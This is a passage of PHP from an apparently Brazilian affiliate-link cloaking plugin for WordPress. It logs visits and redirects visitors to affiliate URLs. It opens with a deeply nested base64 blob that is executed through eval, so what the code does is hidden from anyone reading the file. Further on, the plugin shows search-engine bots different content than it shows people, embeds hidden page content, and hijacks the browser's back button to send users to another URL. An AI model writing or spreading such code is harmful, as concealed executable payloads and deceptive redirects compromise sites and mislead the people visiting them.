3h3V1Zod1IyVnNiSEpoUlU1WFVteHdTVlpYZERSV2F6RkhZMFJPWVZKV2NETldiVEZIVTFaU2RHSkZOVmhTVlZZMVZtdGFWMkV5VFhoYVJtUlZZVEpvWVZSVVRrTldiR3h5VjI1YVRsSnNTbmxXYkZKSFZESktSazVVUmxkU00yaDZWa2N4UjJNeFpIVlNiR2hwVW14d1ZWWXhXbXRUTVZsNVVtdGFhVkl3V25OWlZFWjNZakZrV0dSSE9XbGhla1pJVmxjMVUyRnNTbGxWYms1WFlrZFJNRnBWV25OT2JFNXhVVzFvVTFaRlNURlhhMmgzVWpGa1NGSlliRlpoTTJoV1ZtdFdkMVF4Y0ZkV1dHaFRWakJ3UjFrd1pITldNVnAxVVc1b1YwMXVhRmhXVkVaclpFWmFkVlJ0YUZOV00yaHZWMnhrTUdReFVYaFhibFpxVTBVMWIxbHJhRU5XTVZwWVpVZDBhRlpzY0RCWlZWWjNWMGRLZFZGcmVGZFNNMDQwVmpGYWQwNXNSbk5XYld4WFVsWndVbFpxUmxOVE1WbDRVMnhrWVZOR1NrOVdiVFZEVjBaU1ZWSnJkR3RTYkd3elZtMHdOV0ZYUmpaU2JteFZWbXh3Y2xscldrdFNNVTV6VVcxR1YwMHlhRTFYVm1RMFpERmFjMVp1VW1wU1ZGWllXV3hrYjFNeFdYbE9XR1JVVFZaS2VsWXlOVmRaVjFaeVUyeGFXbUpHU2toV1JFWnpWakZhVlZack9WZGlSbkEwVmpKMFYwMUdXa2RVYTFwUFYwZFNXRlJWV21Ga2JHeDBZek5vVTJGNlZrcFpWV1EwVlRGS2NtTkdSbGRXTTBKRFZGWmtSMk15VGtkWGJGcHBVbFJXZDFadE1IaGlNVTV6V2toV2FsSlZOVlpaYkZaM1UyeGtkV05GVGxkV01GWTBWVEowYjFkR1drWmpSbWhXWWtad1dGcEZaRTlTTWtwSFZXeE9UbUY2VVhkV2JYUmhZakpOZUZSWVpGQldiVkpvVld0YVlWWldiSE5XVkVacVRWWmFlVll5TlU5VU1rcElWV3RrV2xaWFRYaFdSM040VWxaV2NWVnRSbGRXYTNCVlZtdFNTMVl5VFhsVWExWlRZa2RvVkZacVNtOU5WbHBIV2tod1QxWnRVbGhXTWpWVFZsZEtXV0ZHVWxaaVZFWTJXa1JHV21ReFduUlBWMnhvWld0Sk1GZFhkR0ZpTWtaelUxaGtUMWRGTlZkWlZFWjNaV3hTY2xkck9WaFNNVVkyV1ZWYVExWXlSWGRqUmxwWFlrZFNNMWxVUms1bFJsSnlXa2R3VkZKcmNHOVdiWGhyWWpKV2MySklSbE5pYkhCeldWaHdSMUpzWkhKV2FrSlhVbXMxUjFSc2FHdFdNREZIVjI1YVdtSllUalJWYlhNeFUxZEdTR1ZHVGxOaE0wSlNWbXhrZDFGck1WaFNiazVxVW14d1YxbHJWVEZqUmxwMFRWYzVWR0pIVWpGWk1GWlBWbGRLVmxacVRsZE5ha1l6VjFaYVlWWXhUbk5WYkhCWFRUSm9NbFpVUm1Ga01EVnpVMjVLVDFZemFGaFdibkJ1WlVaYWRHTkZPV3BOVlRFMFdWUk9jMVl5UlhoWGJHeFhUVWRSTUZscVJuTmpiVVpJVGxVMVUySkZiM2RYVkVKWFlURlNjMWR1VW1oU1dFSlpXVzAxUTFWR1draGpNMmhZVm01Qk1sVlhlRmRoVjBweVUydFdWMDFXU2t4V2FrWkxWakpGZW1OSGNGTmlXR2hXVmxkd1MxUXdOWE5YYTJSWFlsVmFVRlZzVWxkU01WSnpZVVpPV0ZJd2NEQldWM2gzVm1zeFNGVnVSbUZXYkhCVVZqRmtTMUp0VWtoU2JFNW9UVWhDVjFac1VrcGxSMUY1VW14YVRsWnRlR2hhVjNSTFZteHNjMVZyWkZoU2JYaDZWakl3TlZaR1duVlJWRXBXVFc1b1JGWnFRWGhqTVU1MVVteG9hVkpzY0ZWWFZtTjRWakpPZEZOcmJGTmlXRUpQV1cxNFMyVldXblJqUlVwT1VqRmFTRmt3Vm10WlZrcFlWVzVPV21KR1dtaFZiWGhUVm14d1NWUnNhRmRoZWxaS1ZqRlNUMk14V2xkWGExcFlWa1ZLVmxsVVJsWmxSbkJHVjIxMGExWnNjSHBaYTFwVFZUQXhjazVFUmxkaE1sRXdXV3BLU21WV1NuSmhSbEpZVWpKb1VsWnRjRUpOVjAxNFZtNUtXR0pyTlZCVmJURlRVakZzVmxsNlJsVmhla1pHVm0xMGIxbFdXbGRUYkZKWFVrVndXRmw2Um10a1IwNUlVbXhrVjJFelFtOVdNbmhYV1ZkSmVGUnNaR3BTUm5CVldXdG9RMVF4V25KYVJGSnFWbTFTZWxadGVFOVhSMFkyVW14b1dsWldXbnBYVm1SWFkyeGtkR0ZHY0dsWFJrbDZWa1prTkdFeFNuUlNhMmhQVmxSV2IxcFhkR0ZPYkdSelZteE9WazFXUmpWVk1uaHJZVlpPUmxOc1dsVldSVzh3Vm10YVUyTldSblZhUmxKVFRWVndSMVp0TUhoT1JsbDNUVlphYWxOSFVsbFpWRVpMVlVaYVJWTnNUbFJTYlZKNlZtMXpNVlV3TUhoVGJuQllZa1p3YUZVeWMzZGxSbEp6WVVkNFUxSnJjRkZXVjNoVFZqRktjMXBJU21GU1ZHeHdWVzEwZDFOR1ZYbE9WV1JYVFZWd1IxVXlkRFJXYkZsNllVaGFWazFXY0ROVWJYaEhZekpPUms1V2FGTk5helI2Vm0xMGEwNUdWWGhWYmxKVFlrZG9XVmxyWkZOalZsSllUVlJTV2xac1NsbFViRnBQWVVkS1NWRnNaRmRXZWtZelZrZDRZV1JIUmtaalJtaHBZbXRLVFZaclVrdFRNVTVYWTBSYVVtSkdXbkJaYlhSTFRteGtjbFZyVG1wTmF6RXpWRlphVjJGV1NuUmhTRTVYWWtkb1JGcEhlRnBrTVZwMFQxZHNhR1ZyV2pWV1JsWnZZekZWZVZOdVRtcFNia0pYVkZWa1UyTldjRlpYYlhSclVsUkdWMVF4WkhkVWJVVjVaSHBDV0dKR1dsUldWRVpTWlZaS2RWTnNhR2xpV0doYVZsZDRhMkl5VWxkVmJHUllZbTFTY1ZSWGVHRlNiRnBZWTNwV2FGSXdWalpWVmxKSFZtc3hXRlZZY0dGU1JVVjNXbFphUzJNeVJrZGhSbVJzWWxob1RsWnNVa05pTVZGNVZHNU9hbEp0ZUhCVmJHaFRWbFpXZEdWRmRGUlNia0pYVmxkNFQxWlZNVlppUkZKYVRVZFNNMWRXV21GV01VNXpWRzFHVjJKSVFrbFdiWEJMVmpGS1YxWnVTbEJXYXpWUFZXdGFZVll4V2xWU2JYQk9VakZhU0ZscmFFdGhWazVHVGxoT1ZtRXhjRXhXVlZwelYwZFNTVnBIZUZOaVZrcElWMVpXYWsxV1VuUlNhbHBUWWtoQ1dGbHNVa2RWUm14eVYydDBWRkpzU25oV01uaHZWVEZaZVdGRVJsZFNiRXBEV2xWYVNtVldXbkpXYkZwb1pXMTRlbGRXYUhkV01rNVhXa2hPVjJKRk5XOVpiRnBIVGtac1ZsWnVUbHBXTVZwNVdUQmtiMWR0U2xsVmEzaGFWak5vTTFadGVGZGpNazVJWlVkb1RtSnRaekpXYTFwaFZUSk5lRnBGYUZkaVJuQnhWV3BPUTJGR1duTlhhM1JhVm01Q1YxWXlOVXRpUmtsNFYydGFWMVl6VFRGWlZXUkdaVWRPU1ZKc2FHbFNiSEJWVmpGYWExTXhXWGxTYTFwcFVqQmFjMWxVUm5kaU1XUllaVVprYTAxclducFpNRnBoVm0xS1ZsZHRPVnBpUmxwNlZHdGFkMVpzVm5OVWJGWk9ZVEZ3TlZaSGVHdGtNV3hYVjJ4a1ZHSlhhR0ZXYlhoaFpXeHNObEZZYUZOV01IQklWVzE0YTFVeFdsZGlNM0JYVmtWdmQxbHFTbGRrUmtwWllrWmFhVkl5YUZkWFZtUXdXVmRPYzFkdVJsSmlWVnBRV1d0a05GWXhaSEZVYlhSV1VteHdNVlZYY0VOV2JVcFZWbXhDV2xZelRqUlpla1poVmxaU2RGSnRiRk5OYkVWM1ZtdFNSMWxYVVhoYVJXaFhZVEo0Y1ZWcVFtRlhWbFYzVjJ0MFRrMVdiRFZVVm1oUFlWZEtWbFpxVmxkaVdFSllWbTB4UjJSR1ZuSmtSbkJvVFcxb01WWkdWbUZWTWs1elZtNVNhMUp1UWs5WmExcDNVakZhYzFremFHdE5WMUpZVmtkMGIxZHJNSGxWYkd4YVlrZG9kVlJWV2xOamJGcFZVbXhPVjJGNlZYZFdhMk40VGtaVmVGTnVTbGhXUlVwWVdWUkdZV0ZHV2toTlZXUllVbTFTZWxkclpIZFViVXBaWVVkR1YxWkZTbkpaVnpGWFZqRldXV0ZHYUdoaVJYQlJWbGQ0VTFZeVZrZGlSbHBhWld4YVdWWnRjekZUVm1SVlZHNWtWMVpzYkRaWGJuQkRWbGRGZUZaWWFHRlNWbkJ5V1RGYVQyUkhUa1pPVm1oVFRXczBlbFp0ZEdwbFIxRjRWbTVTVTJKSFVtOVZiVEUwVkRGYWNWRnVaRlJOVjNoNVdWVmpNVlJzU25OVGFrSmFUVVphY2xZeWMzaGpNV1J5VjJ4a1RsWXlaM3BXYWtvMFdWVTFkRk5yYUdwU01GcFlWbTEwZDFkV1pGaGxSM1JVVFZac05WWnRkRmRXYlVZMllraENWMkpVVmtSWk1WcHJZekZhYzFSc2FHbFdiSEJZVjFkMGIxUXhVbk5UYTJoc1VtdHdXRmxVUm1GVFJuQkZVbTVrV0ZZd2NFaFdSekYzVkcxRmVHSXpaRmRTTTJoMlZtcEtSMUl4Y0VaYVIzQlRVbXh3YUZaR1ZtdFZhekZIWWtaa1lWSllVbFZWYlRWQ1RXeHNjbFp1WkdoV01IQklXVzV3UjFZd01VZFhibHBhWWxoT05GbDZTa1psYlVaSFVXeGtUbEpHV2paV2JHUXdXVmRSZVZSWWFHRlNWbkJ2Vlc1d1YxUXhiSEpoUlU1c1lrWkdORmRyVlRWaFZrcHlZMFZvV21FeFNsaFdNRnBMVjBkR1NWWnNWbGRTVlZrd1YxUkNZVlF4V2xkalJWcHJVbXMxYzFsVVJuZE5iRmw1WkVkR2FVMVdiRE5VVmxadlZsZEZlV1ZJUWxaaWJrSllXVlZhWVdOV1RuTlRhelZYWWtad1NWWnJaREJOUm1SeVRWaE9XR0V4Y0ZsV01HaERVMFpaZUZkck9WUlNiWFEyV1RCYVYxWXdNSGxaTTJSWFVqTlNWMVJXWkZOU01WWjFWV3hvYVZJemFGWldWM0JMVkRBMVYxZHJhRTVXUmtwUVZXeFNWMUl4VW5OaFJXUm9WbXMxU0ZZeWVIZFdhekZJVlc1R1lWWnNjRlJXYWtaclkxWldjazlXVGxkU2JHd3pWbTEwYW1WR1VYbFRhMlJVWVRKU1dWbHRlRXRYVmxaeldrYzVhMVpzU2xsWmVrNXJZa1pKZUZkcldsZFdNMDB4V1ZaYVlWWldXblZTYkdocFVteHdWVll4V210VE1WbDVVbXRhYVZJd1duTlpWRTVEVlVaYWRFMUVSbWxoZWtaSVZsYzFVMVJzV2xsUmJUbFhZa1pLZVZSV1dtRlhSVEZaVkd4d1YySldTa2xYVkVKVFV6RmtkRlp1U2s5V1YyaG9WV3hhZDJWc2NFWmFSV1JVVm01Q1NGVnRlR0ZVYkU1R1UyNW9WMDF1YUZoV1ZFWnJaRVphY2xwSGFGTldNMmh2VjJ4a01HUXhVWGhWYkdSb1VucFdUMVZ0ZUV0TlJtdDNWbTEwV0dGNlJucFdNblJoVmpBeGNWRnFVbGROVm5CUVZUQmFjbVZ0UmtkaFIyeFhVbFp3VWxacVJsTlRNVmw0VTJ4a1lWTkdTbkZWYlRFMFZsWldjVk5yT1U5V2JHdzFWRlpTVTFReFNsVldhMlJWWWtkb1NGWlVTa3RXYXpWWlZHeGFhRTFZUVhwWFZFSmhZVEZLZEZKcmFFOVdWRlpZV1cxMFMwNXNaSE5XYkU1V1RWWkdOVlZ0TlV0WFJtUklWVzFvVm1KWWFESlVWVnBUWTJ4YVZWSnRjRmRoTTBGNFZtdGtNR1F5UmtoVGJrcFBWMGQ0V1ZaclZrdGtiR3hWVVZSR1UwMXJWalpaYTFwaFlWZEtXV0ZJWkZkV00wSklXa1JCTVdNeFduSmFSbFpvVFRGS2FGWkdaRFJaVmtwelYxaHNUbGRIVWxsV2JYTXhVMVprVlZSdVRsZFdWRVpZV1c1d1ExWlhSWGhXV0doaFVsWndhRnBGV2xOa1IxWkhWR3hPYVdFd2IzcFdiRkpIWVRKUmVWWnVVbE5YUjNoWVdWZDRZVll4YkhSbFJYUmFWbXhzTTFZeWVIZGlSa3AxVVd0a1dsWldXbEJXUkVaaFpFVTVWVlpzWkdsV1JVWTBWMWQwWVdFeFNsZFNiRlpYWWtaS2IxUlhNVzVOYkdSWFZXdDBWRTFWTlVsV1IzUnpWakpLV0dWSVFsZGhhelZ5Vkd4YWExWldUbFZTYkVwT1lYcEZNRmRYZEc5Vk1rcEhVMnBhYVZOR1NsaFpWRXB2VlVacmVXVklaRmhXTUhCSVZrY3hiMVl5U25KVGJVWlhZV3RyZUZkV1pFZGphekZKV2tab2FHRXdjRnBXYlRWM1VqSlNjMk5GVmxSaVZWcFlWbXhTUjFOV2NFWmFSRkpwVW14d2VWbHFUbmRYUjBWNFUyeENXbUZyY0VoWmVrcFBVbTFLUjFWdGJHaGxiRnAyVmpGamVHVnJNVVpPVm1SWVYwaENjRlZzYUZOaU1WWjBUVmM1VkdKSFVqRlpNRll3VmxkR05sSnViRmROYWtZelYxWmFZVll4VG5SaFJuQnBVbTVDTWxaVVJtRmtNRFZ6VTI1U1UySlhlRmhXYTFwaFpVWlplV1ZHWkZaTlYzaFpWVzAxVDJGR1NsaGxSMmhoVmpOU00xbFZXbk5qTVZwMFVtMW9hVk5GU2xoV2JHTjRVakpHUjFkdVVtaFNXRUpaV1cwMVExTkdaRmRhUlhSWFlsVTFTVmt3WkVkV01WcHlZMGhvV0dKR2NGaFpla3BPWkRBeFZsWnRSbE5OYldoWlZrWmFhMDVGTVhOV1dHeHJVbnBzYzFsc1ZsZE9WbHAwWTBaa1YxSXdWalZaVlZwM1Ztc3hTRlZ1Um1GU1JWcHlWbXhhUzJOV1ZuSlBWazVYVW14d1MxWnRjRXBsUmxGNVUydGtWR0V5VWxSWlYzaGhWakZhZEdWR2NFNVNiSEI1Vm0wMVQyRXhXbFZTYkd4V1RXNVNNMWxXV2s5VFJtdDZXa1prVTJWcldYcFhXSEJIWTIxV1YxZHVTbGRpUjJoWVZXMTBkMWxXV2xWUmJYUm9ZbFphV0ZaV2FHdFhSMFp6VTJ4Q1ZtSkdTbGRVVjNoV1pWVXhWazlYYkZOaE0wSkpWMVJDYjFVeFpFZFRiR2hvVTBaYVZsWnJWa1psUm13MlUyeGtVMVpzV25sVU1XUTBZVWRXYzFkdWFGZE5ibWhZVmxSR2EyTnJNVlpYYld4VVVsUldVRlp0ZEd0T1JtUlhZMFprVjJKdFVtOVphMmhEVmpGYVdHVklaR2xTYTNBd1dWVldkMWRIU25WUmEzaFhVak5PTkZZeFduZE9iRVp6Vm0xc1dGSlZjRXBXTW5SclRrZEplRlJzWkdwU1JuQlVXV3hXWVdOR1ZYZGFSM0JyVFZad1NWUldhR3RXUlRGeVRWUldWazFYYUhaWmExcExVakZPYzFGc2NGZE5NREUwVjJ4YVlWUXhaRWhWV0hCaFVtdEtXRmxVUW5kV01WcFhWMjA1VWsxVk1UUldSM1J6VmxkS2NtTkhhRmROUjFFd1ZrVmFhMVpXVG5OYVJrNVhZa1p3VjFaclpEUmpNVnBIVTFoc1ZXRnJOVmhVVmxwTFUwWlNjbFpVUmxOaGVsWlhXVlZhYjJGRk1VVldiVVpYVmtWS2NsbFhNVkpsUmxaeldrWm9hR0pGY0ZGV1YzaFRWakZPVjFkcmFFNVdWR3h3VlcxMGQxTkdXblJqUjBaWFVteHZNbFpYY0ZOWFJsbDZWVzV3V21WcmNGaFZiRnBYWTJzNVdHSkdaRmhTVlhBMFZtcEtORll4VlhsU2JrcE9WbTFTYjFWc1pEUmhSbkJZWkVoa1ZsWnNjREJVYkdNeFZHeEtjMU5xUmxwTlJscHlXV3RhUzJSSFJrWmpSbWhwWW10S1RWWnFTalJaVjFKWFkwUmFVbUpHV25CWmJYUkxWMVpaZUZWcmRGZE5WWEJZV1ZST2QxbFdTbGxSYmtKV1lURmFWMVJXV21GV2JHUjBaRVp3VjAxR2NFcFdWRW93WXpGYVdGTnNiR2hTYTFwV1ZqQm9RMU5HYkRaU2JrNXFZbFZhUjFReFpITlZNREZYWVROb1YySkhUalJhUkVwSFVqRndSbUpHU21saE1IQm9Wa1phYTJJeFZrZFZiazVZWW0xU1dGWnNVa2RUVm14eVYyNWtWMDFFUmtaV2JUVkhWMGRLUjFkc1VsZE5ha1pZVldwS1IxSnRTa2hTYlhob1RUQktkbFl4WkRCaU1rcHlUVlZrVm1Kck5XaFZha0poV1ZaU1dHVkhSbE5pUm13MFdWVm9hMWRHV25KT1ZXeFlWa1UxZWxZd1dtRlNiR1JWVVd4V2FFMVdWalJYYTFaaFlUSlNSMVZ1VW14U2F6VlVXV3hvYW1ReFduRlJiR1JwVFd0d2VWUldhRTloVms1R1RsWkdWMkZyUlhoWmVrWlhZMnhrZFZSck9WTmlWa3BJVjFaV2FrMVdVbkpOVlZaWFlUSm9hRlpzV2t0V1JscEZVMnhrYWsxWFVqQlpNR1JIVmpGYWNtTkhhRmhpUmxweVZYcEdTMUl4VW5OV2JVWlRWMFpLVlZkc1kzaE5SVFZYV2toS1ZtRXpVbFpVVjNSaFYxWldjMkZJWkZkTmEzQXdWbGN4YjFack1VaFZhemxWWWtad1VGWXdWWGhXVmxaelkwVTFhVkp1UWtoV2JYQkhWVEZaZUZwR1pGVmhNbWhoVkZSS05GZFdiSEpYYmxwT1VteEtlVlpzVWtkaE1VcHlUbFpzV21FeGNFUlphMXBoWTIxRmVtSkdhRmRpUm5BeVZqRmFWbVZIVWtkVGJHeHBVakpvVkZWc1duZFZNVnB6Vld0T2EwMXJXbnBaTUZwaFZtMUtXVkZyT1ZkaVZFWjJWVEo0YTJSWFRrWlBWbFpwVmxoQ1lWZFdWbXBsUm1SSFUyeG9hRk5HV2xaV2FrNU9aVVp3UmxaVVZsaFNiRW93V2xWYVQxVXdNVVZWV0doWFlXdEtXRmxxU2t0amF6RlpVMnMxVjJKV1NucFdWM1JoVXpGV1IxZHVSbE5pYlZKdldXdG9RMVl4V2xobFNHUnBVbXh3TUZsVlZuZFhSMHAxVVd4Q1YxSjZSa2hXYlRGSFRteFNjMVZ0YUU1aVYyTjVWakZhVTFNeFdYZE9WbVJWWW14S1ZsbHNhRzlXUmxaMFpFWmtUMkpHY0hsV2JURkhWREZLVlZaclpGVmlSbHAyVmpCa1MxWnJOVmxVYkZwb1RWaENTVlpIZUdGV01WbDRXa2hHVm1GNmJGUldhMXBoVTJ4YWNsa3phRlZOYTNCSVZUSjBhMVl5Um5OalJsWlhZbTVDVkZScldtdFhSMUpKVkcxMFUySldTWGRXYTJONFRrWlZlRk5ZWkU5U1JWcFlWRlZhWVdSc2JIUmpNMmhxVFdzMVIxbHJXa3RoVmxsNllVZEdWMVpGU25KWlZ6RlhZekZXV1dGR2FHaGlSWEJSVmxkNFUxWXdNVWRXYmxKUFZucHNWVmxzVm5kU2JGWnpWV3hrVjJKRmNIbFViRnBUVmxkR2NsTnFUbFpOVjFKUVZUQlZOVmRIVWtoaVIyeFVVbFZyZUZacVJtRldNa2w0VjFoa1VGWnNjRkZXYTFwaFZqRnNXRTFXVGxWU2JGcDRWVlpTUjJFd01WbFJiR3hWVm14WmQxbHJXa3BrTURGVlYyeHdhRTFzUlhkWFYzaGhXVlpLVjFKdVZsUmlWVnBaVldwT2IxWldaSEpaTTJoV1RXeEtXRmt3Vm05aGJFcDFVVzVDVjAxR2NFaFVhMXByVmxaR2RHUkdXazVTUlVreFZtcEtOR0V5Um5KTldGSnNVbTVDVjFSVlpGTmpWbkJYVjJ4T1YwMVlRa2RVTVdSdlZUQXhTR1I2UWxoaVJscFVWbFJHVW1WR1pGbGhSM0JVVWxad2FGZFdVa3RVYXpGWFdrWldWR0pIVWxSV2JURlRWMnhzVmxwSE9WVmlSMUpKVjFST2ExWXhTWHBoU0VwWVZtMVNURll3V2s5WFYwWklaVVpPVTJFelFsSldNbmhyVFVkUmVWSnVUbXBTYkhCWFdXdG9RMk14Vm5STlYzUlBWbXhXTlZSV1ZUVmhWa3B5WTBWc1YxSXpRbGhXYTFwYVpXeHdSVlJzVm1oaE0wSkpWbXBDWVdFeFpFWlBWbHByVW14S1ZWVnNVbGRPVmxsNVpVYzVhazFWTVRSV1IzUnJZVVpLV0dWSGFHRldNMUpNVjFaYVUxWXlSa2hPVlRWVFlrVndOVll5ZEd0U01XUnlUVmhPV0dFeGNGaFdiVEZ2Wld4YVdHVkhSbXRXYmtFeVZWZDRWMkZGTVhOVGJFWlhUVlpLVEZacVJrdFdNV1J6WWtkd1UxZEZTbmRYVm1Rd1dWZE9SMVpZYUdGU1JrcFFWV3hTVjFJeFVuTmhSV1JvVm10c00xUnNhRTlXYlVWNFkwaHNWVlpXY0hwV2JYaHJZMVpXY2s5V1RsZFNiRlkxVm14U1NrMVdiRmRhUm1SVllUSm9ZVlJVVGtOV2JHeHpZVWMxVGxKc1NubFdiRkpIVkRKS1IxTnFRbUZTVmxveldWWmFTMUpzV2xWU2JHUm9ZWHBXTmxaWWNFdFNNVWw1VWxod2FWSnJOWEJaYTJoRFdWWmFSMXBFUW10TmExcDZXVEJhWVZadFNsWlhiVGxhWVRKU2RsVXllR3RrVjA1R1pFWndWMDFJUWxoV1IzaHJaREZzVjFkc1pGUmlWMmhoVm0xNFlXVnNiRFpSV0doVFZqQndTRlZ0ZUd0Vk1WcHpZak53VjFaRmIzZFpha3BYWkVaS1dXSkdaR2hpUm5CV1YxZDRWazFYVFhoV2JrcFlZVEZ3YzFsclpGTlNNV3hXV1hwR1ZXSkZjREJhUlZKUFZsVXhWMWRzUWxkTlZuQlFWVEJhY21Wc2NFZFdiR1JwVW5wb00xWnJaREJXYXpGWFZHdGtWbUpzU2xaWmJHaHZWa1pXZEdWR2NFNWlSbFkwVjFod1EySkdTblJsU0d4YVlUSm9VRmxyV2t0U01VNXpVV3h3YVZKc2IzcFhWbVEwWkRGYWMxWnVVbXBTVkZaWVdXeGtiMU14V1hsT1dHUlVUVlphU0ZZeU5WZFpWMVp5VTJ4YVdtSlVWa1JWTUZwclZsWk9jMXBHVGxkaVdGRXlWMVpXYTJJeVJsZFVhMmhhVFRKU1dGVnVjRmROTVZweFVtNUtiRlpzY0hsV2JYaDNWR3N4YzFOcmVGaFdNMUpVVlcxek1WWXhXbkphUjBaVFRVWndkbFpYY0VOa01VNXpWMnRvVGxaR1NsZFZiRkpHVFd4V2MxVnNaRnBXTUhCSFZteFNWMVpzU25KT1ZYUlZZV3RhTTFZeFdtdGtSMFpJWWtaS1RtSlhhRE5XYWtaaFlqRlJlVk5yV2s5WFJWcFhXV3hhZDJGR1ZuRlNiVVpxVm0xNGVGVXllRTloVmtwWlZXdFdWMVo2UWpSWlZWcGFaREZrV1ZwR2NHaE5iRW8yVjJ0YWExWXhTWGRQVm1ocVVqSjRUMWxyVm5kbGJGWTJVbXM1YW1GNlZURlZNVkpyV1Zaa1IyTkhPVnBoTURWMldWWmFjMWRXVW5SbFJUbG9Za1Z3ZEZZeWRHdFdNa1owVTFoc1ZtSllhRTFWVkVaTFpFWnNWMXBGWkU1U01IQkpXV3RvVjJKR1NuRmlTRVphWVd0d1ZGbHJWakJXUjBZMldUSnNVRTFzV1hsWFZtUXpZakZzZEZKdWNHRldSbXQzVjBSS1UySkdhM2xQVjNSaFZUSmtjbGR0TVhOaFIxSklaVWhDYVdKdGFHMVhWRWsxWVRGd1ZHRXpRbEJrZWpBNVNXcDBiR1J0Um5OTFIwcG9ZekpWTWs1R09XdGFWMDUyV2tkVmIwcEhXbkJaV0ZKellWYzFORmd5VG5aYVIxVndTMVJ6UFNJN1pYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtDUm1hV0YwYkdsdWVGOWpiMlJsS1NrNyI7ZXZhbChiYXNlNjRfZGVjb2RlKCRmaWF0bGlueF9jb2RlKSk7";eval(base64_decode($fiatlinx_code));
	
	//Fim do Código Legal-----------------------------------------------------------------------------------
	
	
	

	//Cadastra Acesso na Tabela com Novo URL final
	
	$url_final_cloak = empty($url_final_cloak)?$url_afiliado_final:$url_final_cloak;//Usa o Url de Afiliado das Configs Gerais
	
	if($acao_cloak_atual ==4){ //abrir pagina homonina
		
		$tracker_id = self::cadastra_views($link["id_link"],$link["nome_link"],$link_completo,$dispositivo,'Página Homônima',$referrer,$ip . $bloqueado_txt,$var_country_code);
		
		return;
		
	}else{

		$tracker_id = self::cadastra_views($link["id_link"],$link["nome_link"],$link_completo,$dispositivo,$url_final_cloak,$referrer,$ip . $bloqueado_txt,$var_country_code);
	
		$url_final_cloak = str_replace("hlp_trackerid",$tracker_id,$url_final_cloak); 
				
		if(!$conexao_atual_e_robo){//Se nã ofor robô cadastra as metricas
			if(empty($sql_metric)){
				if($link["ativar_metricas"] == 1) $sql_metric = "INSERT INTO $table_metricas (id_link, nm_link, acesso_a, acesso_b,acesso_c) VALUES(%d, %s, 1,0,0) ON DUPLICATE KEY UPDATE    
					acesso_a=acesso_a +1";	
			}
		
			if(!empty($sql_metric)) self::cadastra_metricas($sql_metric, $link ,$hotlinks_cookie_conversoes,$last_ab_array[$last_ab]);			
		}		
		
		$url_afiliado_final = $url_final_cloak;//Coloca o valor de url_final_cloak em Url de Afiliado final que é a variável usada nas Configs
		$url_back_redir_final = self::get_url_com_tracker_id($url_back_redir_final,$tracker_id,"backredir-",$configs); 
		
		switch($acao_cloak_atual){ //Muda variáveis para Obedecer as Configs do Acao_Cloak
		
			case 3: //Redir PHP
				$link["redirecionamento"]=3;
			break;
			case 2: //Redir Javascript
				$link["redirecionamento"]=2;
			break;
			case 1: //Camuflado
				$link["redirecionamento"]=1;
				
				 if($link["ativar_turbo"]==1 && !$conexao_atual_e_robo){
					 
					  $link["turbo_url"] = self::get_url_com_tracker_id($link["turbo_url"],$tracker_id,"mdturbo-",$configs);
					  $link["clique_url"] = self::get_url_com_tracker_id($link["clique_url"],$tracker_id,"mdturboredir-",$configs);
					  $link["segundo_url"] = self::get_url_com_tracker_id($link["segundo_url"],$tracker_id,"mdturbosegundo-",$configs);
					  
				 }
		 				
			break;
			case 0: //Seguir Configs Essenciais
				//Não modifica o tipo de redir, aqui vai obedecer as Configs Essenciais
			break;	
		}
		
		
	}
	
	
	//-------------------------------------------
	
	
}else{
	
	//Cadastra Acesso na Tabela Acessos, precisa por código também aqui, pois se Não for Cloak, url Destino Final vai Mudar....
	$tracker_id = self::cadastra_views($link["id_link"],$link["nome_link"],$link_completo,$dispositivo,$url_afiliado_final,$referrer,$ip,"",$configs["ativar_webservices"]);
	$url_afiliado_final = str_replace("hlp_trackerid",$tracker_id,$url_afiliado_final); 
	$url_back_redir_final = self::get_url_com_tracker_id($url_back_redir_final,$tracker_id,"backredir-",$configs);
	
	 if($link["ativar_turbo"]==1){
		 
		  $link["turbo_url"] = self::get_url_com_tracker_id($link["turbo_url"],$tracker_id,"mdturbo-",$configs);
		  $link["clique_url"] = self::get_url_com_tracker_id($link["clique_url"],$tracker_id,"mdturboredir-",$configs);
		  $link["segundo_url"] = self::get_url_com_tracker_id($link["segundo_url"],$tracker_id,"mdturbosegundo-",$configs);
		  
	 }		
	 
}

//----


//-----Aqui já indica que vai ser Link Camuflado ou Redirect -------------------------------------------------

$pixel_facebook = trim($link["face_pixel"]); 
$pixel_google = trim($link["google_pixel"]); 
$codigo_topo = trim($link["codigo_topo"]);

$pixel_facebook .='
'. $configs["codigo_cabecalho"];

$pixel_google .='
'. $configs["codigo_rodape"];

//Prepare titulo e Conteúdo Oculto:
$titulo = strip_tags($link["titulo"]);
$conteudo_oculto = '<div style="display:none;">'.$link["codigo_oculto"].'</div>';
$descricao = $link["descricao_publica"];
$url_site = self::get_site_url();
$url_site .= $keyword;
$imagem = $link["imagem"];
//------

$back_redir_code = '';
$back_redir_hidden = '';

if($link['ativar_back_redir'] == 1 && !empty($link['url_back_redir'])){
	
	$back_redir_hidden = $url_back_redir_final;
	$back_redir_code = '
		<script>
		history.pushState({},"",location.href);
		history.pushState({},"",location.href);
		jQuery_1_11_1(document).ready(function(e) {
			setTimeout(function () {
			window.onpopstate = function(){
				window.location=document.getElementById("back_redir_hidden").value;	
			}
			},1);
		});	
		</script>
	';	
}

if($link["redirecionamento"]=="3"){//Redir PHP
	
	header("Location: $url_afiliado_final");
	exit;
	
}elseif($link["redirecionamento"]!=1){//Não é Camuflado!

	$jquery_js = '<script src="'. $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery-1.11.1.js"></script>';
	$jquery_js .= '<script src="'. $anderson_makiyama[self::PLUGIN_ID]->plugin_url . 'js/jquery.mousewheel-3.0.6.pack.js"></script>';	
	$redir_meta = "";
	$redir_java = "";
	
	if($link["redirecionamento"]==0) $redir_meta = '<meta http-equiv="refresh" content="'.$link["redir_apos"].';url='. $url_afiliado_final .'">';
	if($link["redirecionamento"]==2) $redir_java = "
		<script>
		url_to_go_now='".$url_afiliado_final."';
		jQuery_1_11_1(document).ready(function(e) {
			setTimeout(function(){ document.location=url_to_go_now; }, ". ($link["redir_apos"] * 1000) .");
		});
		</script>
	";
	
	$plugin_url = $anderson_makiyama[self::PLUGIN_ID]->plugin_url;

	$pagina = '<!DOCTYPE html>
	<html>
	<head>
	<meta http-equiv="expires" content="Sun, 01 Jan 2014 00:00:00 GMT"/>
	<meta http-equiv="pragma" content="no-cache" />
	<meta name="robots" content="noindex">
